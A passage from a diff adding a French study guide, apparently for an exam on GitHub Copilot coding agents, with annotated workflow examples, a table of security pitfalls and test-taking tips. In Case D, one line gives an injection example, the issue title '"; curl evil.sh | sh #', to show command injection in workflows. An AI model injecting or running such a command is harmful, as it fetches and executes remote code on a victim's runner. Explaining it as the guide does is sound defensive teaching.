+            --title "Revert ${COMMIT:0:7}" \
+            --body "Annulation du commit $COMMIT"</code></pre>
+<p><strong>Explication.</strong> On annule avec <code>git revert</code>, qui ajoute un commit : l'historique est conservé, contrairement à <code>reset --hard</code> + <code>push --force</code>. Le revert passe par une <strong>PR</strong>, donc par les checks et la revue habituels, jamais par un push direct sur <code>main</code>. L'écriture est confinée à ce workflow, déclenché à la main, derrière l'environnement <code>rollback</code>. La saisie <code>inputs.commit</code> transite par <code>env:</code> pour éviter l'injection.</p>
+
+<h3>Cas D · Contenu d'issue non fiable (injection de prompt / de commande)</h3>
+<pre class="code" data-lang="yaml" data-file=".github/workflows/triage-issue.yml"><code># Nom du workflow dans l'onglet Actions (le check requis porte le nom du JOB)
+name: triage-issue
+
+# Déclencheurs : les évènements qui démarrent le workflow
+on:
+  # Sur évènement d'issue (contenu fourni par un tiers : non fiable)
+  issues:
+    # Sous-évènements précis qui déclenchent le workflow
+    types:
+      # PR (ou issue) ouverte
+      - opened
+
+# Droits du jeton GITHUB_TOKEN : moindre privilège (lecture par défaut)
+permissions:
+  # Lire le code uniquement, aucune écriture
+  contents: read
+  # Modifier les issues (labels) et rien d'autre
+  issues: write
+
+# Les jobs : unités de travail. Le NOM du job devient le nom du check
+jobs:
+  # Job de tri : droits limités aux issues
+  etiqueter:
+    # Machine virtuelle hébergée qui exécute le job
+    runs-on: ubuntu-latest
+    # Variables d'environnement : entrées externes passées sans injection
+    env:
+      # Jeton pour la CLI gh, limité par permissions
+      GH_TOKEN: ${{ github.token }}
+      # Numéro d'issue passé par variable
+      ISSUE_NUMBER: ${{ github.event.issue.number }}
+      # Titre contrôlé par un tiers : reste une simple chaîne grâce à env
+      ISSUE_TITLE: ${{ github.event.issue.title }}
+    # Étapes exécutées dans l'ordre
+    steps:
+      - name: Étiqueter selon le titre
+        run: |
+          # Choisit le label selon le titre (comparaison, pas exécution)
+          case "$ISSUE_TITLE" in
+            # Titre contenant « bug »
+            *[Bb]ug*) label=bug ;;
+            # Par défaut : à trier par un humain
+            *)        label=a-trier ;;
+          esac
+          # Ajoute le label : seule action autorisée par le jeton
+          gh issue edit "$ISSUE_NUMBER" --repo "$GITHUB_REPOSITORY" --add-label "$label"</code></pre>
+<p><strong>Explication.</strong> Le titre d'une issue est contrôlé par un tiers. Écrit directement en <code>${{ github.event.issue.title }}</code> dans <code>run:</code>, un titre tel que <code>"; curl evil.sh | sh #</code> s'exécuterait. En le passant par une variable d'<code>env:</code>, il reste une simple chaîne. Le job n'a que <code>issues: write</code> et ne checkout rien : si le titre est hostile, la portée des dégâts est minime. Rappel : un label n'est pas une autorisation (un rôle <em>triage</em> peut en poser).</p>
+
+<h3>Cas E · Agents en parallèle sans conflit</h3>
+<pre class="code" data-lang="yaml" data-file=".github/workflows/lots-paralleles.yml"><code># Nom du workflow dans l'onglet Actions (le check requis porte le nom du JOB)
+name: lots-paralleles
+
+# Déclencheurs : les évènements qui démarrent le workflow
+on:
+  # Lancement manuel par un humain (pas d'exécution implicite)
+  workflow_dispatch:
+
+# Droits du jeton GITHUB_TOKEN : moindre privilège (lecture par défaut)
+permissions:
+  # Lire le code uniquement, aucune écriture
+  contents: read
+
+# Les jobs : unités de travail. Le NOM du job devient le nom du check
+jobs:
+  # Un job par lot d'agent (matrice)
+  lot:
+    # Machine virtuelle hébergée qui exécute le job
+    runs-on: ubuntu-latest
+    # Coupe le job s'il boucle (agent ou test bloqué)
+    timeout-minutes: 20
+    # Stratégie d'exécution du job
+    strategy:
+      # Un lot en échec n'annule pas les autres (échec partiel)
+      fail-fast: false
+      # Matrice : un job par valeur
+      matrix:
+        # Trois lots, donc trois jobs en parallèle
+        lot: [lot-1, lot-2, lot-3]
+    # Évite deux exécutions simultanées du même groupe
+    concurrency:
+      # Clé d'exclusion : un groupe par lot
+      group: ${{ matrix.lot }}
+      # Ne pas annuler un lot en cours
+      cancel-in-progress: false
+    # Étapes exécutées dans l'ordre
+    steps:
+      # Récupère le code du dépôt (sans ça, aucun fichier à tester)
+      - uses: actions/checkout@v4
+      - name: Exécuter le lot
+        # Exécute le lot courant
+        run: ./scripts/executer-lot.sh "${{ matrix.lot }}"
+      # Conserve le résultat comme artefact inspectable
+      - uses: actions/upload-artifact@v4
+        # S'exécute même si une étape précédente a échoué (preuve conservée)
+        if: always()
+        # Paramètres de l'action
+        with:
+          # Un artefact par lot : journal inspectable
+          name: journal-${{ matrix.lot }}
+          # Fichier de journal du lot
+          path: journaux/${{ matrix.lot }}.md
+
+  # Job d'agrégation des résultats de tous les lots
+  consolider:
+    # Attend les lots (avec if: always, même s'ils échouent)
+    needs: lot
+    # S'exécute même si une étape précédente a échoué (preuve conservée)
+    if: always()
+    # Machine virtuelle hébergée qui exécute le job
+    runs-on: ubuntu-latest
+    # Étapes exécutées dans l'ordre
+    steps:
+      # Récupère l'artefact produit plus tôt
+      - uses: actions/download-artifact@v4
+        # Paramètres de l'action
+        with:
+          # Récupère tous les journaux de lots
+          pattern: journal-*
+          # Les met dans un même dossier
+          merge-multiple: true
+      # Concatène en un bilan de consolidation
+      - run: cat *.md &gt; bilan.md</code></pre>
+<p><strong>Explication.</strong> Chaque lot travaille sur son périmètre, indépendamment : <code>matrix</code> + <code>concurrency</code> par lot évitent les exécutions concurrentes d'un même lot. <code>fail-fast: false</code> gère l'<strong>échec partiel</strong> : un lot en erreur n'annule pas les autres. <code>if: always()</code> garantit que le journal de chaque lot est téléversé même en cas d'échec (observabilité, reprise). Le job <code>consolider</code> agrège les artefacts et tourne même si un lot a échoué, pour que l'humain voie l'état réel. <code>timeout-minutes</code> borne les agents qui bouclent.</p>
+
+<h3>Cas F · Agent relecteur en lecture seule, qui rend la main</h3>
+<pre class="code" data-lang="md" data-file=".github/agents/relecteur.agent.md"><code>---
+# Identifiant de l'agent
+name: relecteur
+# Dit QUAND utiliser cet agent (sert à le choisir)
+description: Relit une PR et signale les écarts à la politique, sans rien modifier.
+# Liste blanche d'outils : ce qui n'est pas listé n'existe pas pour l'agent
+tools:
+  # Lire des fichiers
+  - read
+  # Chercher dans le dépôt
+  - search
+  # Outil MCP « serveur/outil » : doit aussi être autorisé côté serveur
+  - github/get_pull_request
+  # Outil MCP « serveur/outil » : doit aussi être autorisé côté serveur
+  - github/list_pull_request_files
+# Serveurs MCP embarqués avec ce profil
+mcp-servers:
+  # Nom local du serveur MCP
+  github:
+    # Transport du serveur : HTTP
+    type: http
+    # Adresse du serveur (variante lecture seule quand c'est possible)
+    url: https://api.githubcopilot.com/mcp/readonly
+    # Outils exposés par le serveur : liste d'autorisation côté serveur
+    tools:
+      # Outil autorisé côté serveur
+      - get_pull_request
+      # Outil autorisé côté serveur
+      - list_pull_request_files
+---
+
+# Rôle
+Tu relis une PR et tu produis un rapport. Tu ne modifies aucun fichier.
+
+## Sortie attendue
+Un fichier `sortie/revue.md` contenant :
+- ## Écarts constatés (avec chemin et ligne)
+- ## Contraintes du plan respectées / violées
+- ## Décisions à prendre par un humain
+
+## Règles
+- Comparer le diff au plan `PLAN.md` et signaler toute contradiction.
+- Ne jamais approuver ni fusionner : conclure par une recommandation.
+- En cas de doute sur une règle métier, poser une question ouverte.</code></pre>
+<p><strong>Explication.</strong> L'outil <code>edit</code> n'est pas listé : l'action d'écrire <strong>n'existe pas</strong> pour cet agent, c'est le moindre privilège par construction (et pas seulement par consigne). Le MCP est en lecture seule et ses outils sont énumérés. L'agent livre un artefact durable (<code>sortie/revue.md</code>) plutôt que de « se souvenir ». Les décisions irréversibles (approuver, fusionner) et métier restent à l'humain. Il compare au plan écrit : c'est ce qui permet de détecter une violation de passation comme dans l'exemple 8.</p>
+
+<div class="box memo"><b>Ce que ces six cas ont en commun</b><ul>
+<li>Un <strong>mécanisme</strong> (check, environnement, outil absent) et non une phrase dans un prompt.</li>
+<li>Des <code>permissions</code> minimales, élargies uniquement dans le job qui en a besoin.</li>
+<li>Un <strong>artefact</strong> ou une PR comme trace durable.</li>
+<li>Un humain sur l'irréversible : publication, rollback, fusion.</li>
+</ul></div>
+
+<h2>10 · Grande liste des pièges</h2>
+<p>Classés par thème. Pour chaque piège : la mauvaise réponse tentante, pourquoi elle est fausse, et la bonne réponse.</p>
+<div class="box memo"><b>Filtre universel</b>Si deux réponses se valent, gardez celle qui <strong>impose par un mécanisme</strong>, avec le <strong>moindre privilège</strong>, une <strong>trace durable</strong>, un <strong>humain seulement sur l'irréversible</strong> et une <strong>preuve</strong> (CI, scan, journal) plutôt qu'une affirmation de l'agent.</div>
+
+<h3>SDLC et architecture</h3>
+<div class="tablewrap"><table><thead><tr><th>Piège</th><th>Pourquoi c'est faux</th><th>Bonne réponse</th></tr></thead><tbody>
+<tr><td>Un seul agent qui planifie, code, teste et fusionne</td><td>Aucune séparation, aucun point de contrôle, erreurs en cascade</td><td>Séparer planifier / raisonner / agir, avec une passation écrite</td></tr>
+<tr><td>Commencer à coder sans plan</td><td>Périmètre flou, dérive, revue impossible</td><td>Fichier de plan (scope, fichiers touchés, risques, tests, rollback) validé avant</td></tr>
+<tr><td>« Les tests passent » = prêt à fusionner</td><td>Tests verts ne valent pas approbation ni conformité</td><td>Revue humaine + checks requis</td></tr>
+<tr><td>Donner à l'agent toute la décision métier</td><td>Une décision métier ou de conformité engage l'organisation</td><td>Question ouverte, humain tranche</td></tr>
+<tr><td>Mettre le même niveau d'autonomie partout</td><td>Trop lent sur le faible risque, trop risqué sur l'élevé</td><td>Autonomie graduée selon le risque</td></tr>
+<tr><td>Étapes sans entrées/sorties définies</td><td>Chaque étape ne peut pas être vérifiée ni reprise</td><td>Chaque étape a un artefact d'entrée et de sortie inspectable</td></tr>
+<tr><td>Issue trop vague assignée à l'agent</td><td>Résultat imprévisible</td><td>Critères d'acceptation, fichiers concernés, contraintes explicites</td></tr>
+<tr><td>Dépôt = seulement du code</td><td>Instructions, agents, workflows sont aussi du code qui agit</td><td>Les traiter comme de la chaîne d'approvisionnement (CODEOWNERS)</td></tr>
+</tbody></table></div>
+
+<h3>Workflows et CI</h3>
+<div class="tablewrap"><table><thead><tr><th>Piège</th><th>Pourquoi c'est faux</th><th>Bonne réponse</th></tr></thead><tbody>
+<tr><td>Check requis nommé comme le workflow</td><td>Le statut porte le nom du <strong>job</strong> : jamais rapporté, fusion bloquée</td><td>Requérir le nom du job</td></tr>
+<tr><td>Pas de <code>merge_group:</code></td><td>Le check ne tourne pas dans la file de fusion</td><td>Ajouter <code>merge_group</code> aux déclencheurs</td></tr>
+<tr><td>Job <code>copilot-setup-steps</code> renommé</td><td>Copilot ne le reconnaît plus, sans erreur</td><td>Nom exact <code>copilot-setup-steps</code></td></tr>
+<tr><td><code>contents: write</code> sur tout le workflow</td><td>Tous les jobs héritent de l'écriture</td><td><code>permissions</code> par job, <code>read</code> par défaut</td></tr>
+<tr><td><code>${{ github.event.* }}</code> dans <code>run:</code></td><td>Injection de commande par titre, branche, corps de PR</td><td>Passer par <code>env:</code></td></tr>
+<tr><td>Action tierce en <code>@v3</code> ou <code>@main</code></td><td>Tag déplaçable : code non maîtrisé</td><td>Épingler par SHA complet</td></tr>
+<tr><td><code>pull_request_target</code> + checkout de la PR</td><td>Code non fiable exécuté avec des secrets et des droits d'écriture</td><td>Éviter, ou ne jamais exécuter le code de la PR</td></tr>
+<tr><td>Les workflows de l'agent tournent seuls</td><td>Ils attendent <strong>Approve and run workflows</strong></td><td>Une approbation humaine les lance</td></tr>
+<tr><td>Pas de <code>timeout-minutes</code></td><td>Un agent ou un test qui boucle consomme sans fin</td><td>Borner les jobs</td></tr>
+<tr><td><code>continue-on-error: true</code> sur un contrôle</td><td>Le contrôle ne bloque plus rien</td><td>Laisser échouer</td></tr>
+<tr><td>Type <code>ready</code> au lieu de <code>ready_for_review</code></td><td>Évènement inexistant, jamais déclenché</td><td>Noms exacts des types</td></tr>
+<tr><td>Secrets dans les logs ou le dépôt</td><td>Fuite durable</td><td>Secrets GitHub, masquage, secret scanning</td></tr>
+</tbody></table></div>
+
+<h3>Branches, revue et fusion</h3>
+<div class="tablewrap"><table><thead><tr><th>Piège</th><th>Pourquoi c'est faux</th><th>Bonne réponse</th></tr></thead><tbody>
+<tr><td>CODEOWNERS sans « Require review from Code Owners »</td><td>Le fichier est purement informatif</td><td>Activer l'exigence dans le ruleset</td></tr>
+<tr><td>« Allow bypassing required pull requests » actif</td><td>Un administrateur contourne toute la politique</td><td>Désactiver le contournement</td></tr>
+<tr><td>Chemins sensibles absents du CODEOWNERS</td><td>L'agent modifie son propre profil avec une revue ordinaire</td><td>Couvrir <code>.github/agents/**</code>, instructions, <code>mcp.json</code>, workflows</td></tr>
+<tr><td>Équipe CODEOWNERS sans accès en écriture</td><td>Elle n'est pas prise en compte</td><td>Donner l'accès au dépôt</td></tr>
+<tr><td>Un label vaut autorisation</td><td>Un rôle <em>triage</em> peut poser des labels</td><td>Seule la revue protégée autorise</td></tr>
+<tr><td>Le demandeur approuve la PR de l'agent</td><td>Auto-approbation : pas de second regard</td><td>Un autre relecteur approuve</td></tr>
+<tr><td>Agent qui fusionne ou passe en « prête »</td><td>Il ne peut ni approuver ni fusionner : PR brouillon</td><td>Un humain passe en prête et fusionne</td></tr>
+<tr><td>Push forcé ou suppression de branche autorisés</td><td>Réécriture d'historique, perte de traçabilité</td><td>Les bloquer dans le ruleset</td></tr>
+<tr><td>Plusieurs agents sur la même branche</td><td>Conflits et écrasements</td><td>Une branche par lot ou par agent</td></tr>
+</tbody></table></div>
+
+<h3>Rollback et reprise sur erreur</h3>
+<div class="tablewrap"><table><thead><tr><th>Piège</th><th>Pourquoi c'est faux</th><th>Bonne réponse</th></tr></thead><tbody>
+<tr><td><code>git reset --hard</code> + <code>push --force</code></td><td>Réécrit l'historique, perd les preuves</td><td><code>git revert</code> par PR, ou redéployer un SHA sain</td></tr>
+<tr><td>Réessayer indéfiniment</td><td>Masque une cause racine, boucle de coût</td><td>Nombre borné de tentatives, puis escalade</td></tr>
+<tr><td>Réessayer une action non idempotente</td><td>Doublons, effets répétés</td><td>Rendre idempotent ou vérifier l'état avant</td></tr>
+<tr><td>Corriger plusieurs causes à la fois</td><td>On ne sait plus ce qui a fonctionné</td><td>Classer la cause, corriger une chose à la fois</td></tr>
+<tr><td>Aucun plan de retour arrière</td><td>Incident sans issue sûre</td><td>Notes de rollback dans le plan</td></tr>
+<tr><td>Escalader à chaque erreur</td><td>Bruit, perte de vitesse</td><td>Escalader sur irréversible, ambigu ou échec répété</td></tr>
+</tbody></table></div>
+
+<h3>Mémoire, état et contexte</h3>
+<div class="tablewrap"><table><thead><tr><th>Piège</th><th>Pourquoi c'est faux</th><th>Bonne réponse</th></tr></thead><tbody>
+<tr><td>« L'agent s'en souviendra »</td><td>Le contexte court est perdu entre sessions</td><td>Écrire dans un artefact durable (<code>PLAN.md</code>, journal)</td></tr>
+<tr><td>Tout garder dans le contexte</td><td>Saturation, dérive, coût</td><td>Résumer, externaliser, ne charger que le nécessaire</td></tr>
+<tr><td>Mémoire sans expiration</td><td>Faits périmés traités comme vrais</td><td>Durée de vie, date, source, revalidation</td></tr>
+<tr><td>Deux sources contradictoires</td><td>L'agent choisit au hasard</td><td>Hiérarchie de sources, signaler le conflit à l'humain</td></tr>
+<tr><td>Reprise sans état sauvegardé</td><td>Tout recommencer ou refaire deux fois</td><td>Journal par lot, point de reprise explicite</td></tr>
+<tr><td>Mémoire qui stocke des secrets ou données personnelles</td><td>Fuite, non-conformité</td><td>Ne jamais mémoriser de secrets ; minimiser les données</td></tr>
+<tr><td>Faire confiance à une mémoire écrite par l'agent</td><td>Une erreur ou une injection se propage</td><td>Vérifier contre la source, relecture des écritures sensibles</td></tr>
+<tr><td>Instruction obsolète dans <code>copilot-instructions.md</code></td><td>L'agent applique des règles périmées</td><td>Revue régulière, propriétaires désignés</td></tr>
+</tbody></table></div>
+
+<h3>MCP et outils</h3>
+<div class="tablewrap"><table><thead><tr><th>Piège</th><th>Pourquoi c'est faux</th><th>Bonne réponse</th></tr></thead><tbody>
+<tr><td><code>tools: ["*"]</code></td><td>Tous les outils, dont ceux qui écrivent</td><td>Énumérer les outils nécessaires</td></tr>
+<tr><td>Outil listé côté agent mais absent côté serveur</td><td>Refusé : incohérence agent ↔ serveur</td><td>Aligner les deux listes</td></tr>
+<tr><td>Serveur MCP hors registre</td><td>Source non approuvée, risque d'exfiltration</td><td>Liste d'autorisation / registre de l'organisation</td></tr>
+<tr><td>MCP en lecture-écriture « au cas où »</td><td>Surface d'attaque inutile</td><td>Lecture seule par défaut</td></tr>
+<tr><td>Secret en clair dans <code>mcp.json</code></td><td>Exposé dans l'historique</td><td>Secret de type <strong>Agents</strong>, référencé par nom</td></tr>
+<tr><td><code>execute</code> sans garde-fou</td><td>Commande arbitraire</td><td>Hook <code>preToolUse</code>, liste d'autorisation de commandes</td></tr>
+<tr><td>Ajouter un MCP sans revue</td><td>Décision de sécurité, pas de confort</td><td><code>mcp.json</code> sous CODEOWNERS sécurité</td></tr>
+<tr><td>Faire confiance au contenu retourné par un outil</td><td>Injection de prompt via un résultat d'outil</td><td>Traiter la sortie comme une donnée non fiable</td></tr>
+<tr><td>Pare-feu du cloud agent désactivé pour « que ça marche »</td><td>Ouvre l'exfiltration</td><td>Autoriser seulement les hôtes nécessaires</td></tr>
+</tbody></table></div>
+
+<h3>Politiques, hooks et Copilot CLI</h3>
+<div class="tablewrap"><table><thead><tr><th>Piège</th><th>Pourquoi c'est faux</th><th>Bonne réponse</th></tr></thead><tbody>
+<tr><td>Hook de sécurité qui répond <code>allow</code></td><td>Court-circuite l'approbation normale</td><td>Répondre <code>{}</code> sans objection, <code>deny</code> sinon</td></tr>
+<tr><td><code>deny</code> sans raison</td><td><code>permissionDecisionReason</code> est obligatoire</td><td>Toujours fournir la raison</td></tr>
+<tr><td>Hook lent</td><td><strong>Délai dépassé = autorisé</strong> (fail-open), 30 s par défaut</td><td>Hook court et rapide</td></tr>
+<tr><td>Script qui plante</td><td>Pour <code>preToolUse</code> : refus (fail-closed)</td><td>Tester le script, gérer les erreurs</td></tr>
+<tr><td>Hook HTTP en erreur</td><td>Autorisé : fail-open</td><td>Préférer une commande locale pour un contrôle critique</td></tr>
+<tr><td><code>--allow-all-tools</code></td><td>Aucun contrôle par outil</td><td>Autoriser au cas par cas, <code>--deny-tool</code> pour le reste</td></tr>
+<tr><td>Croire que l'allow l'emporte sur le deny</td><td>Le refus est prioritaire</td><td>Le deny gagne</td></tr>
+<tr><td>Option de ligne de commande comme politique</td><td>L'utilisateur peut la retirer</td><td>Hook de politique administrateur</td></tr>
+<tr><td><code>ask</code> dans le cloud agent</td><td>Pas d'humain pour répondre : vaut <code>deny</code></td><td>Prévoir allow ou deny explicites</td></tr>
+<tr><td><code>agentStop</code> qui bloque sans fin</td><td>Boucle (garde-fou après 8 blocages)</td><td>Tester <code>stop_hook_active</code></td></tr>
+</tbody></table></div>
+
+<h3>Observabilité et évaluation</h3>
+<div class="tablewrap"><table><thead><tr><th>Piège</th><th>Pourquoi c'est faux</th><th>Bonne réponse</th></tr></thead><tbody>
+<tr><td>Juger uniquement sur « ça a l'air bon »</td><td>Signal subjectif seul</td><td>Mélanger signaux qualitatifs et quantitatifs</td></tr>
+<tr><td>Croire l'affirmation de l'agent</td><td>Il peut se tromper ou halluciner « les tests passent »</td><td>Preuve : résultat CI, scan, journal</td></tr>
+<tr><td>Un seul indicateur (ex. taux de succès)</td><td>Cache coût, durée, régressions</td><td>Plusieurs métriques : qualité, coût, délai, reprises</td></tr>
+<tr><td>Pas de critères de succès définis avant</td><td>On ne peut pas évaluer ni comparer</td><td>Critères d'acceptation mesurables posés au départ</td></tr>
+<tr><td>Changer instructions, outils et mémoire ensemble</td><td>Impossible d'attribuer l'effet</td><td>Un changement à la fois, comparer avant / après</td></tr>
+<tr><td>Corriger un symptôme</td><td>La cause revient</td><td>Cause racine : raisonnement, outil, contexte ou environnement</td></tr>
+<tr><td>Pas de journal par agent</td><td>Échec multi-agents impossible à diagnostiquer</td><td>Journaux et identifiant de corrélation par lot</td></tr>
+<tr><td>Scans seulement en fin de projet</td><td>Découverte tardive, coût élevé</td><td>Scans automatiques dans la CI à chaque PR</td></tr>
+<tr><td>Un job « success » = conforme</td><td>Peut respecter la forme et violer la règle</td><td>Un réviseur compare décision durable et résultat</td></tr>
+</tbody></table></div>
+
+<h3>Multi-agents et orchestration</h3>
+<div class="tablewrap"><table><thead><tr><th>Piège</th><th>Pourquoi c'est faux</th><th>Bonne réponse</th></tr></thead><tbody>
+<tr><td>Agents partagent le même espace de travail</td><td>Écritures concurrentes, conflits</td><td>Isolation : branche et périmètre par agent</td></tr>
+<tr><td>Passation par conversation</td><td>Contexte perdu ou déformé</td><td>Artefact de passation écrit (<code>planner-handoff.md</code>)</td></tr>
+<tr><td>L'implémenteur ignore une contrainte du planificateur</td><td>Violation de passation</td><td>Contrainte vérifiable par check, réviseur indépendant</td></tr>
+<tr><td>Un échec annule tout le lot</td><td>Perte du travail réussi</td><td><code>fail-fast: false</code>, reprise partielle</td></tr>
+<tr><td>Agent « chef » qui contourne les garde-fous</td><td>Les permissions ne se transmettent pas par confiance</td><td>Chaque agent garde son propre moindre privilège</td></tr>
+<tr><td>Trop d'agents pour une tâche simple</td><td>Coût et coordination sans gain</td><td>Choisir le schéma le plus simple qui convient</td></tr>
+<tr><td>Agents sans fin de vie définie</td><td>Agents orphelins, ressources consommées</td><td>Délai, condition d'arrêt, nettoyage</td></tr>
+<tr><td>Fusionner les sorties sans réconciliation</td><td>Résultats contradictoires</td><td>Étape de consolidation puis revue</td></tr>
+</tbody></table></div>
+
+<h3>Autonomie et humain dans la boucle</h3>
+<div class="tablewrap"><table><thead><tr><th>Piège</th><th>Pourquoi c'est faux</th><th>Bonne réponse</th></tr></thead><tbody>
+<tr><td>Approuver chaque commande à la main</td><td>Tue la vitesse sans réduire le risque</td><td>Contrôles automatiques + approbation sur l'irréversible</td></tr>
+<tr><td>Aucune approbation nulle part</td><td>Risque non maîtrisé</td><td>Humain sur fusion, déploiement, secrets, droits, suppression</td></tr>
+<tr><td>Approbation de façade (« OK » en lot)</td><td>Ne réduit aucun risque</td><td>Une revue ciblée où le risque est réel</td></tr>
+<tr><td>Autonomie complète en production</td><td>Irréversible et conformité</td><td>Environnement protégé, approbateurs, pas d'auto-approbation</td></tr>
+<tr><td>Autonomie fixée une fois pour toutes</td><td>Le risque dépend de l'action et du contexte</td><td>Classer par risque opérationnel, sécurité, conformité</td></tr>
+<tr><td>Laisser l'agent décider des priorités métier</td><td>Hors de son mandat</td><td>Décision humaine, question ouverte</td></tr>
+</tbody></table></div>
+
+<h3>Traçabilité et responsabilité</h3>
+<div class="tablewrap"><table><thead><tr><th>Piège</th><th>Pourquoi c'est faux</th><th>Bonne réponse</th></tr></thead><tbody>
+<tr><td>Commits anonymes ou non signés</td><td>On ne sait pas qui a agi</td><td>Commits signés, auteur Copilot, demandeur en co-auteur</td></tr>
+<tr><td>Pas de lien vers la session</td><td>Raisonnement non vérifiable</td><td>Lien vers le journal de session dans la PR</td></tr>
+<tr><td>Décision de l'agent sans justification écrite</td><td>Pas d'audit possible</td><td>Plan, journal, PR décrivant le pourquoi</td></tr>
+<tr><td>Ne pas conserver l'audit log</td><td>Pas de preuve en cas d'incident</td><td>Audit log activé et conservé</td></tr>
+<tr><td>Responsabilité reportée sur l'agent</td><td>L'humain reste responsable de ce qu'il fusionne</td><td>Le relecteur répond du résultat</td></tr>
+<tr><td>Données sensibles dans les prompts</td><td>Fuite et conformité (IA responsable)</td><td>Minimiser, masquer, respecter la politique de l'organisation</td></tr>
+<tr><td>Commentaires HTML ou caractères cachés non filtrés</td><td>Injection de prompt invisible</td><td>Filtrage : commentaires HTML non transmis au cloud agent</td></tr>
+<tr><td>Pas de journal des décisions humaines</td><td>Impossible de justifier une dérogation</td><td>Trace de l'approbation (PR, environnement, ticket)</td></tr>
+</tbody></table></div>
+
+<h2>11 · Trucs et astuces</h2>
+<p>La boîte à outils pour répondre vite et juste. Les réflexes de l'accueil, mais déclinés par thème, avec les mots-clés à repérer, la méthode d'élimination et les chiffres à connaître.</p>
+
+<h3>Les 20 réflexes généraux</h3>
+<div class="box astuce"><b>Quand vous hésitez, choisissez celle qui…</b>
+<ol>
+<li><strong>Impose</strong> par ruleset, check requis, hook, permission ou environnement plutôt que par une phrase d'instruction.</li>
+<li><strong>Retire la capacité</strong> (outil non listé, jeton en lecture) plutôt que de demander poliment de ne pas l'utiliser.</li>
+<li><strong>Garde un humain sur l'irréversible</strong> : fusion, déploiement, suppression, secrets, droits.</li>
+<li><strong>Ne met pas d'humain ailleurs</strong> : une approbation qui ne réduit aucun risque est une mauvaise réponse.</li>
+<li><strong>Laisse une trace durable</strong> : plan, PR, commit signé, journal, artefact.</li>
+<li><strong>S'appuie sur des preuves</strong> : CI, scan, journal, jamais l'affirmation de l'agent.</li>
+<li><strong>Annule sans réécrire l'histoire</strong> : <code>revert</code>, redéploiement d'un SHA sain.</li>
+<li><strong>Traite la cause racine</strong>, une chose à la fois.</li>
+<li><strong>Isole</strong> : une branche, un périmètre, un environnement par agent ou par lot.</li>
+<li><strong>Est la plus simple</strong> qui satisfait toutes les contraintes : pas d'architecture plus lourde que le besoin.</li>
+<li><strong>Passe par un chemin contrôlé</strong> (PR, environnement protégé) plutôt que par un contournement.</li>
+<li><strong>Est automatique et déterministe</strong> pour le répétitif (hook, check) et humaine pour le jugement.</li>
+<li><strong>Échoue fermé</strong> : en cas de doute, refuser.</li>
+<li><strong>Sépare les rôles</strong> : qui écrit n'est pas qui approuve, qui planifie n'est pas qui exécute.</li>
+<li><strong>Traite toute entrée externe comme non fiable</strong> : issue, titre de PR, sortie d'outil, page web.</li>
+<li><strong>Limite le rayon d'action</strong> d'une erreur : petit lot, brouillon, branche jetable.</li>
+<li><strong>Garde la vitesse</strong> : autonomie sur le faible risque, contrôles automatiques.</li>
+<li><strong>Documente la décision</strong> là où elle sera retrouvée : PR, <code>PLAN.md</code>, journal.</li>
+<li><strong>Vérifie l'état réel</strong> avant d'agir (idempotence, contexte frais), jamais sur une mémoire périmée.</li>
+<li><strong>Escalade</strong> quand c'est irréversible, ambigu ou après des échecs répétés, pas systématiquement.</li>
+</ol></div>
+
+<h3>Mots-clés de l'énoncé et réponse attendue</h3>
+<div class="tablewrap"><table><thead><tr><th>Si l'énoncé dit…</th><th>Pensez à…</th></tr></thead><tbody>
+<tr><td>« garantir », « empêcher », « impossible de »</td><td>Un <strong>mécanisme</strong> : ruleset, check requis, hook <code>deny</code>, permission, environnement</td></tr>
+<tr><td>« encourager », « guider », « préférer »</td><td>Une <strong>instruction</strong> (<code>copilot-instructions.md</code>, profil d'agent)</td></tr>
+<tr><td>« moindre privilège », « minimiser les droits »</td><td><code>permissions</code> par job, <code>tools</code> listés, MCP lecture seule</td></tr>
+<tr><td>« irréversible », « production », « publier »</td><td>Environnement protégé, approbateur, humain</td></tr>
+<tr><td>« sans ralentir », « maximiser la vitesse »</td><td>Contrôles automatiques, pas d'approbation manuelle systématique</td></tr>
+<tr><td>« audit », « prouver », « conformité »</td><td>Commits signés, journal de session, audit log, artefacts</td></tr>
+<tr><td>« reprendre », « redémarrer », « session interrompue »</td><td>État externe durable : <code>PLAN.md</code>, journal par lot</td></tr>
+<tr><td>« contexte périmé », « données contradictoires »</td><td>Hiérarchie de sources, expiration, revalidation, question à l'humain</td></tr>
+<tr><td>« plusieurs agents », « en parallèle »</td><td>Isolation (branche), passation écrite, consolidation, échec partiel</td></tr>
+<tr><td>« fuite », « exfiltration »</td><td>Pare-feu, secrets de type Agents, secret scanning, MCP restreint</td></tr>
+<tr><td>« injection », « contenu non fiable »</td><td><code>env:</code> au lieu de <code>${{ }}</code>, filtrage, sortie d'outil traitée comme donnée</td></tr>
+<tr><td>« chaîne d'approvisionnement »</td><td>SHA épinglé, CODEOWNERS sur workflows / agents / MCP</td></tr>
+<tr><td>« annuler », « revenir en arrière »</td><td><code>git revert</code> par PR</td></tr>
+<tr><td>« cause racine », « pourquoi échoue »</td><td>Classer : raisonnement, outil, contexte ou environnement</td></tr>
+<tr><td>« mesurer », « évaluer »</td><td>Critères définis avant, signaux quantitatifs <em>et</em> qualitatifs, CI</td></tr>
+<tr><td>« l'agent affirme que… »</td><td>Ne pas le croire : exiger une preuve</td></tr>
+<tr><td>« tous les outils », « accès complet »</td><td>Presque toujours la mauvaise réponse</td></tr>
+<tr><td>« désactiver la protection pour que ça passe »</td><td>Mauvaise réponse : corriger la cause</td></tr>
+</tbody></table></div>
+
+<h3>Méthode d'élimination</h3>
+<div class="box memo"><b>En 5 passes sur un QCM</b><ol>
+<li><strong>Éliminez les extrêmes</strong> : « toujours », « jamais », « tous », « aucun » sont rarement justes.</li>
+<li><strong>Éliminez les réponses qui élargissent les droits</strong> (<code>write</code> partout, bypass, désactiver un check).</li>
+<li><strong>Éliminez celles qui ralentissent sans réduire de risque</strong> (approuver chaque commande).</li>
+<li><strong>Éliminez celles qui ne laissent pas de trace</strong> ou reposent sur la mémoire de l'agent.</li>
+<li>Entre les deux restantes, prenez celle qui <strong>impose</strong> plutôt que <strong>demande</strong>.</li>
+</ol></div>
+<div class="box astuce"><b>Questions « Select all »</b><ul>
+<li>Évaluez chaque proposition <strong>indépendamment</strong> : vraie ou fausse, sans les comparer.</li>
+<li>Comptez le nombre de réponses demandé s'il est indiqué.</li>
+<li>Une proposition juste mais hors sujet reste fausse pour la question posée.</li>
+</ul></div>
+<div class="box astuce"><b>Questions « Missing value »</b><ul>
+<li>Repérez la <strong>syntaxe exacte</strong> : <code>run:</code>, <code>uses:</code>, <code>permissions</code>, nom de job imposé.</li>
